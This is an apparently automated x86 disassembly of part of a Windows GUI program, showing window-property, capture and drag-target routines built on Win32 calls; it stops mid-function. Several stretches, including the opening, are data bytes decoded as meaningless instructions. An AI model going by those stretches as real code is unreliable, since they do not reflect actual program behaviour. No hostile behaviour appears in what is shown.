add eax [ eax + eax + 0x38 ]
add al 0x44
add [ esp + eax + 0x4e00044 ] al
inc esp
add [ edx + eax ] bh
inc esp
add al ah
loopne r-xdata
inc ebx
add [ eax - 0xc ] al
inc ebx
add [ eax - 0xb ] cl
inc ebx
add [ eax ] bh
push ss
inc esp
add ah cl
adc [ eax + eax - 0x4 ] al
cmc
inc ebx
add [ ecx + edi * 8 + 0x43 ] dl
add [ edx + edi * 8 ] bh
inc ebx
add [ ebx + edi * 8 ] cl
inc ebx
add al dh
std
inc ebx
add [ eax + 0x140043f5 ] ah
adc [ eax + eax - 0x58 ] eax
or [ eax + eax + 0x68 ] al
or al [ eax + eax - 0x7c ]
hlt
add [ ecx + ecx + 0x44 ] ch
add [ edi + esi * 8 - 0x757ffbd ] bh
inc ebx
add al dl
clc
inc ebx
add [ esi + edi * 8 + 0x1c440043 ] ah
inc esp
add al bh
adc eax 0xc080044
inc esp
add [ esi + eax ] dh
inc esp
add [ esi + esi * 8 - 0x967ffbd ] dl
inc ebx
add [ eax ] dh
hlt
sub_436eb8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x43 ] ch
add [ eax ] ch
add [ eax ] al
add [ eax + 0x4c004010 ] ah
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf4004030
xor [ eax ] al
or [ esp + eax * 2 + 0x6f ] edx
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_436fa8
mov [ edi + 0x43 ] ch
add [ edx - 0x63ffbc91 ] dl
outsd
inc ebx
add [ 0x1500436f ] cl
outsd
inc ebx
add [ 0x2500436f ] bl
outsd
inc ebx
add [ edx ] dh
outsd
inc ebx
add [ edi ] bh
outsd
inc ebx
add [ edi + ebp * 2 + 0x43 ] cl
add [ ecx + 0x6f ] bl
inc ebx
add [ esi + 0x6f ] ah
inc ebx
add [ ebx + 0x6f ] dh
inc ebx
add [ eax + 0x100436f ] al
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x6fa8e870 ] eax
inc ebx
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax + esi * 2 + 0x43 ] cl
add al ah
outsd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x70 ] bh
inc ebx
add [ eax ] bh
add [ eax ] al
xchg esp eax
adc [ eax ] eax
dec esp
xor eax [ eax ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
jo r-xdata
inc eax
add [ eax + 0x60004055 ] al
xor eax [ eax ]
push esp
xor eax [ eax ]
nop
push ebp
inc eax
add [ eax - 0x67ffbfd0 ] bh
xor [ eax + eax - 0x14 ] al
xor [ eax + eax + 0x64 ] al
xor al [ eax + eax + 0x74 ]
xor al [ eax + eax + 0x34 ]
cmp al [ eax + eax + 0x1c ]
cmp eax 0x3f5c0044
inc esp
add [ eax + 0x41 ] ah
inc esp
add [ esi + eax * 2 + 0x44 ] ah
add [ eax ] bl
inc esp
inc esp
add [ eax ] dh
das
inc esp
add al bh
cmp eax 0x54090044
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
retn
add [ eax ] ch
add [ eax ] al
add [ eax + 0x4c004010 ] ah
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0x4c004030
push ebx
inc esp
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
retn
mov eax eax
shl [ eax + 0x43 ] 0x1
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
nop
sub_4370ec
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_4371a4
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_4371d8
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404314
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_4371a4
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_437234
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_437418
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c23c
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404374
mov eax edi
mov edx esi
call sub_403ea8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43745c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c23c
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404374
mov eax edi
mov edx esi
call sub_403ea8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4374a0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_43b4f4
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43751c
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
jne r-xdata
mov eax ebx
call sub_440b28
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_4375c8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_413d6c
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_4375fc
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_440b28
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_437624
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026bc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_4375fc
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_4375c8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413c10
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_413de8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437680
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_413c44
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413d6c
mov edx 0x8
call sub_4026dc
inc esi
dec ebx
jne r-xdata
sub_4376b4
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_413d6c
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_4375c8
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_437718
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_437778
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403054
mov edx esp
mov eax esi
call sub_4040b8
add esp 0x100
pop esi
pop ebx
retn
sub_4377b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43787e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_4388d4
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43825c
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_40682c
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_43825c
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_4388d4
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43825c
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_4388d4
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_437883
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45a284
call sub_40390c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_4388d4
sub_4378dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_437906
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43796c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_437718
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_437998
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403300
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_4379c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403300
xor edx edx
sub_437a1c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_4426dc
sub_437a3c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_4426c4
sub_437a60
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_437948
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d24c
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_423ea8
mov edx eax
mov eax esi
call sub_41d3c8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_437ac4
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_437af4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43796c
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_437b50
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403300
pop edi
pop esi
pop ebp
retn 0x4
sub_437b74
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_437b98
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_437b74
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_437b74
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_437c54
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_437cc0
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_438110
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4371d8
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_440b28
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_440b28
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_440b28
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403300
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_437c54
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_440b28
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_440b28
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_437e58
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_440b28
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_440b28
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_437e9c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_4376b4
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_437cc0
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_413d6c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_440b28
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_437e58
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403300
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43f658
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_437624
sub_437ff8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_413dc8
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_413c5c
mov edx edi
mov eax [ rw-data ]
call sub_413c10
jmp r-xdata
sub_438058
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_4380b0
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404314
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_4371a4
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_438110
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4380b0
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43813c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_437e9c
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_438110
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_438058
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_440b28
mov [ esi ] eax
sub_43818c
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_438058
cmp eax 0x1
sbb eax eax
inc eax
sub_4381c8
push ebx
push esi
push edi
xor edi edi
